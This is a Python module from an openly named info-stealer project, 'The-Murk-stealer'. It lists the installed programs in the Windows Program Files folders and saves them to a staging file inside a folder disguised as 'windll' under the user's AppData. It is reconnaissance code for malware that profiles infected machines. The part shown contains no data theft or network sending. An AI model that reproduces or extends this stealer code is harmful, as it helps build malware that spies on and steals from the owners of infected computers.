#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

from os import environ,sep,listdir
from manager.logger import Log

path = r"C:\Program Files (x86)"
path1 = r"C:\Program Files"

def Programs():
    try:
        pathtofolder = environ['USERPROFILE'] + sep + r'AppData\Local'
        dirs = listdir(path)
        with open(rf"{pathtofolder}\windll\System\Programs.txt", "a", encoding="utf-8") as prog:
             prog.write(path+"\n")
        prog.close()
        for programs in dirs:
                with open(rf"{pathtofolder}\windll\System\Programs.txt", "a", encoding="utf-8") as prog:
                    prog.write(programs+"\n")
        prog.close()



        dirs = listdir(path1)
        with open(rf"{pathtofolder}\windll\System\Programs.txt", "a", encoding="utf-8") as prog:
             prog.write(path1+"\n")
        prog.close()
        for programs in dirs:
                with open(rf"{pathtofolder}\windll\System\Programs.txt", "a", encoding="utf-8") as prog:
                    prog.write(programs+"\n")
        prog.close()
    except Exception as e:
        Log(f"Programs ---> {e}")